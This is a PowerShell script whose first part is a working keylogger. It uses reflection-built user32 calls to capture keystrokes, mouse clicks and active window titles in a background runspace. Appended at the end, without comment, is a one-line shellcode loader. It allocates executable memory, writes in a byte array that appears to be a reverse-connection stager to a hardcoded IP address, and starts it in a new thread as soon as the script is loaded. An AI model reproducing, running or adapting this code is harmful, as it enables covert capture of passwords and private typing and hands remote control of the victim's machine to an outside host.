function Get-Keystrokes {

    [CmdletBinding()] Param (
    [Int32]
    $PollingInterval = 40,
    [Int32]
    $RunningTime = 60
    
    )

    $scriptblock = @"
    function KeyLog {
    `$PollingInterval = $PollingInterval

    [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null

    try
    {
        `$ImportDll = [User32]
    }
    catch
    {
        `$DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
        `$AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(`$DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
        `$ModuleBuilder = `$AssemblyBuilder.DefineDynamicModule('Win32Lib', `$False)
        `$TypeBuilder = `$ModuleBuilder.DefineType('User32', 'Public, Class')

        `$DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
        `$FieldArray = [Reflection.FieldInfo[]] @(
            [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
            [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling'),
            [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'),
            [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'),
            [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
            [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
        )

        `$PInvokeMethod = `$TypeBuilder.DefineMethod('GetAsyncKeyState', 'Public, Static', [Int16], [Type[]] @([Windows.Forms.Keys]))
        `$FieldValueArray = [Object[]] @(
            'GetAsyncKeyState',
            `$True,
            `$False,
            `$True,
            [Runtime.InteropServices.CallingConvention]::Winapi,
            [Runtime.InteropServices.CharSet]::Auto
        )
        `$CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(`$DllImportConstructor, @('user32.dll'), `$FieldArray, `$FieldValueArray)
        `$PInvokeMethod.SetCustomAttribute(`$CustomAttribute)

        `$PInvokeMethod = `$TypeBuilder.DefineMethod('GetKeyboardState', 'Public, Static', [Int32], [Type[]] @([Byte[]]))
        `$FieldValueArray = [Object[]] @(
            'GetKeyboardState',
            `$True,
            `$False,
            `$True,
            [Runtime.InteropServices.CallingConvention]::Winapi,
            [Runtime.InteropServices.CharSet]::Auto
        )
        `$CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(`$DllImportConstructor, @('user32.dll'), `$FieldArray, `$FieldValueArray)
        `$PInvokeMethod.SetCustomAttribute(`$CustomAttribute)

        `$PInvokeMethod = `$TypeBuilder.DefineMethod('MapVirtualKey', 'Public, Static', [Int32], [Type[]] @([Int32], [Int32]))
        `$FieldValueArray = [Object[]] @(
            'MapVirtualKey',
            `$False,
            `$False,
            `$True,
            [Runtime.InteropServices.CallingConvention]::Winapi,
            [Runtime.InteropServices.CharSet]::Auto
        )
        `$CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(`$DllImportConstructor, @('user32.dll'), `$FieldArray, `$FieldValueArray)
        `$PInvokeMethod.SetCustomAttribute(`$CustomAttribute)

        `$PInvokeMethod = `$TypeBuilder.DefineMethod('ToUnicode', 'Public, Static', [Int32],
            [Type[]] @([UInt32], [UInt32], [Byte[]], [Text.StringBuilder], [Int32], [UInt32]))
        `$FieldValueArray = [Object[]] @(
            'ToUnicode',
            `$False,
            `$False,
            `$True,
            [Runtime.InteropServices.CallingConvention]::Winapi,
            [Runtime.InteropServices.CharSet]::Auto
        )
        `$CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(`$DllImportConstructor, @('user32.dll'), `$FieldArray, `$FieldValueArray)
        `$PInvokeMethod.SetCustomAttribute(`$CustomAttribute)

        `$PInvokeMethod = `$TypeBuilder.DefineMethod('GetForegroundWindow', 'Public, Static', [IntPtr], [Type[]] @())
        `$FieldValueArray = [Object[]] @(
            'GetForegroundWindow',
            `$True,
            `$False,
            `$True,
            [Runtime.InteropServices.CallingConvention]::Winapi,
            [Runtime.InteropServices.CharSet]::Auto
        )
        `$CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(`$DllImportConstructor, @('user32.dll'), `$FieldArray, `$FieldValueArray)
        `$PInvokeMethod.SetCustomAttribute(`$CustomAttribute)

        `$ImportDll = `$TypeBuilder.CreateType()
    }

    Start-Sleep -Milliseconds `$PollingInterval

        try
        {

            
            for (`$TypeableChar = 1; `$TypeableChar -le 254; `$TypeableChar++)
            {
                `$VirtualKey = `$TypeableChar
                `$KeyResult = `$ImportDll::GetAsyncKeyState(`$VirtualKey)

                
                if ((`$KeyResult -band 0x8000) -eq 0x8000)
                {

                    
                    `$LeftShift    = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LShiftKey) -band 0x8000) -eq 0x8000
                    `$RightShift   = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RShiftKey) -band 0x8000) -eq 0x8000
                    `$LeftCtrl     = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LControlKey) -band 0x8000) -eq 0x8000
                    `$RightCtrl    = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RControlKey) -band 0x8000) -eq 0x8000
                    `$LeftAlt      = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LMenu) -band 0x8000) -eq 0x8000
                    `$RightAlt     = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RMenu) -band 0x8000) -eq 0x8000
                    `$TabKey       = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Tab) -band 0x8000) -eq 0x8000
                    `$SpaceBar     = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Space) -band 0x8000) -eq 0x8000
                    `$DeleteKey    = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Delete) -band 0x8000) -eq 0x8000
                    `$EnterKey     = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
                    `$BackSpaceKey = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Back) -band 0x8000) -eq 0x8000
                    `$LeftArrow    = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Left) -band 0x8000) -eq 0x8000
                    `$RightArrow   = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000) -eq 0x8000
                    `$UpArrow      = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000) -eq 0x8000
                    `$DownArrow    = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000) -eq 0x8000
                    `$LeftMouse    = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000) -eq 0x8000
                    `$RightMouse   = (`$ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000

                    if (`$LeftShift -or `$RightShift) {`$LogOutput += '[Shift]'}
                    if (`$LeftCtrl  -or `$RightCtrl)  {`$LogOutput += '[Ctrl]'}
                    if (`$LeftAlt   -or `$RightAlt)   {`$LogOutput += '[Alt]'}
                    if (`$TabKey)       {`$LogOutput += '[Tab]'}
                    if (`$SpaceBar)     {`$LogOutput += '[SpaceBar]'}
                    if (`$DeleteKey)    {`$LogOutput += '[Delete]'}
                    if (`$EnterKey)     {`$LogOutput += '[Enter]'}
                    if (`$BackSpaceKey) {`$LogOutput += '[Backspace]'}
                    if (`$LeftArrow)    {`$LogOutput += '[Left Arrow]'}
                    if (`$RightArrow)   {`$LogOutput += '[Right Arrow]'}
                    if (`$UpArrow)      {`$LogOutput += '[Up Arrow]'}
                    if (`$DownArrow)    {`$LogOutput += '[Down Arrow]'}
                    if (`$LeftMouse)    {`$LogOutput += '[Left Mouse]'}
                    if (`$RightMouse)   {`$LogOutput += '[Right Mouse]'}

                    
                    if ([Console]::CapsLock) {`$LogOutput += '[Caps Lock]'}

                    `$MappedKey = `$ImportDll::MapVirtualKey(`$VirtualKey, 3)
                    `$KeyboardState = New-Object Byte[] 256
                    `$CheckKeyboardState = `$ImportDll::GetKeyboardState(`$KeyboardState)

                    
                    `$StringBuilder = New-Object -TypeName System.Text.StringBuilder;
                    `$UnicodeKey = `$ImportDll::ToUnicode(`$VirtualKey, `$MappedKey, `$KeyboardState, `$StringBuilder, `$StringBuilder.Capacity, 0)

                    
                    if (`$UnicodeKey -gt 0) {
                        `$TypedCharacter = `$StringBuilder.ToString()
                        `$LogOutput += ('['+ `$TypedCharacter +']')
                    }

                    
                    `$TopWindow = `$ImportDll::GetForegroundWindow()
                    `$WindowTitle = (Get-Process | Where-Object { `$_.MainWindowHandle -eq `$TopWindow }).MainWindowTitle

                    
                    `$TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)

                    
                    `$ObjectProperties = @{'Key Typed' = `$LogOutput;
                                            'Time' = `$TimeStamp;
                                            'Window Title' = `$WindowTitle}
                    `$ResultsObject = New-Object -TypeName PSObject -Property `$ObjectProperties

                    
                    `$CSVEntry = (`$ResultsObject | ConvertTo-Csv -NoTypeInformation)[1]
                    `$sessionstate.log += `$CSVEntry
                   
                }
            }
        }
        catch {}
    }

`$timeout = new-timespan -Minutes $RunningTime
`$sw = [diagnostics.stopwatch]::StartNew()
while (`$sw.elapsed -lt `$timeout){Keylog}

"@

$global:sessionstate = "2"
$PollingInterval = 40

$global:sessionstate = [HashTable]::Synchronized(@{})
$sessionstate.log = New-Object System.Collections.ArrayList

$HTTP_runspace = [RunspaceFactory]::CreateRunspace()
$HTTP_runspace.Open()
$HTTP_runspace.SessionStateProxy.SetVariable('sessionstate',$sessionstate)
$HTTP_powershell = [PowerShell]::Create()
$HTTP_powershell.Runspace = $HTTP_runspace
$HTTP_powershell.AddScript($scriptblock) > $null
$HTTP_powershell.BeginInvoke() > $null

echo ""
echo "[+] Started Keylogging for $RunningTime minutes"
echo ""
echo "Run Get-KeystrokeData to obtain the keylog output"
echo ""
}

function Get-KeystrokeData {
    echo ""
    "[+] Keylog data:"
    echo $sessionstate.log
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xc2,0x81,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

